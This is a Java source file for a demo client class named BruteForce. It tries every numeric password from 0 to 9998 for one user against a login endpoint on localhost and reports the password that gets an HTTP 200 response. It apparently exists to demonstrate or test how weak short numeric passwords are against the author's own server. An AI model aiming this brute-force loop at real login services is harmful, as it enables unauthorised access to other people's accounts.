package com.example.demo.client;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class BruteForce {

    String api = "http://localhost:8081/loginforce";

    String userAdmin = "apa2";
    int iterations = 9999;

    private void Program(){
        long start = System.nanoTime();
        for (int password = 0; password < iterations; password++) {
            long start2 = System.nanoTime();
            String formatPassword = String.valueOf(password);
            System.out.println("Attempt: " + password);

            if(apiRequest(userAdmin, formatPassword)){
                System.out.println("Password: " + password);
                break;
            }
            long end2 = System.nanoTime();
            long total = end2 - start2;
            System.out.println("Total time: " + total / 1_000_000_000 + " seconds per attempt");
        }
        long end = System.nanoTime();
        long total = end - start;
        System.out.println("Total time: " + total / 1_000_000_000 + " seconds");
    }

    private boolean apiRequest(String user, String password){
        try {

            HttpURLConnection con = (HttpURLConnection) new URL(api).openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            con.setDoOutput(true);

            String formData = "username=" + user + "&password=" + password;

            try(OutputStream os = con.getOutputStream()) {
                byte[] input = formData.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            return con.getResponseCode() == 200;
        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }


    public static void main(String[] args) {
        BruteForce bruteForce = new BruteForce();
        bruteForce.Program();
    }
}